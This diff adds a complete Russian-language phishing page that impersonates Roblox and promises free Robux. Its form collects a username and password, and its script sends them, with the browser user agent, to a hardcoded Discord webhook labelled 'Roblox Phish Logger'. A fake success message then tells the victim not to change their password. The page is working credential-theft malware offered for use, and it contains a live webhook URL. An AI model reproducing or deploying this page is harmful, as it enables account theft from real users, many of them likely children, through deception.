@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox | Redeem Rewards</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Hanna+Custom&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #191B1D;
+            font-family: 'Roboto', sans-serif;
+            color: white;
+        }
+        .rbx-card {
+            background-color: #232527;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+        }
+        .rbx-btn {
+            background-color: #0084FF;
+            transition: background 0.2s;
+        }
+        .rbx-btn:hover {
+            background-color: #0074E0;
+        }
+        .rbx-input {
+            background-color: #393B3D;
+            border: 1px solid #111;
+            color: white;
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <!-- Header -->
+    <nav class="w-full bg-[#232527] p-4 flex justify-between items-center border-b border-[#111]">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="h-8 invert" alt="Logo">
+        <div class="space-x-4 text-sm font-bold uppercase tracking-wider">
+            <a href="#" class="hover:text-gray-300">Игры</a>
+            <a href="#" class="hover:text-gray-300">Магазин</a>
+            <a href="#" class="hover:text-gray-300">Создать</a>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="flex-grow flex items-center justify-center p-6">
+        <div class="rbx-card w-full max-w-md p-8 text-center">
+            <h1 class="text-2xl font-bold mb-2">Бесплатные Robux и Лимитки</h1>
+            <p class="text-gray-400 text-sm mb-6">Введите данные вашего аккаунта для верификации и получения награды на ваш баланс.</p>
+            
+            <div id="login-form">
+                <div class="mb-4">
+                    <input type="text" id="username" placeholder="Имя пользователя / Почта" class="rbx-input w-full p-3 rounded focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                <div class="mb-6">
+                    <input type="password" id="password" placeholder="Пароль" class="rbx-input w-full p-3 rounded focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                <button onclick="sendData()" class="rbx-btn w-full py-3 rounded font-bold text-lg">ПОЛУЧИТЬ НАГРАДУ</button>
+            </div>
+
+            <div id="success-msg" class="hidden">
+                <div class="text-green-500 mb-4">
+                    <svg class="w-16 h-16 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                </div>
+                <h2 class="text-xl font-bold mb-2">Запрос принят!</h2>
+                <p class="text-gray-400">Награда будет зачислена на ваш аккаунт в течение 24 часов. Не выходите из системы и не меняйте пароль до завершения процесса.</p>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="p-8 text-center text-xs text-gray-500">
+        <p>©2026 Roblox Corporation. Roblox, логотип Roblox и Powering Imagination являются нашими зарегистрированными товарными знаками.</p>
+    </footer>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1470843366400069722/9x7qxSAF7d3jUBStOGjjHS4d9Mee6Oe-Ldlw1UhKrvUdQEgaRVzvFdJio-Mpbj3cV7lh";
+
+        async function sendData() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            if (!user || !pass) {
+                alert("Пожалуйста, заполните все поля!");
+                return;
+            }
+// Формируем сообщение для Discord
+            const payload = {
+                username: "Roblox Phish Logger",
+                embeds: [{
+                    title: "🎯 Новый лог получен!",
+                    color: 16711680,
+                    fields: [
+                        { name: "👤 Пользователь", value: "" + user + "", inline: true },
+                        { name: "🔑 Пароль", value: "" + pass + "", inline: true },
+                        { name: "🌐 User-Agent", value: navigator.userAgent }
+                    ],
+                    footer: { text: "LARB SYSTEM v7.2 | AS-1.0" },
+                    timestamp: new Date()
+                }]
+            };
+
+            try {
+                // Отправляем данные на вебхук
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                // Скрываем форму, показываем успех
+                document.getElementById('login-form').classList.add('hidden');
+                document.getElementById('success-msg').classList.remove('hidden');
+            } catch (err) {
+                console.error("Error sending to webhook", err);
+                alert("Ошибка соединения с сервером. Попробуйте позже.");
+            }
+        }
+    </script>
+</body>
+</html>
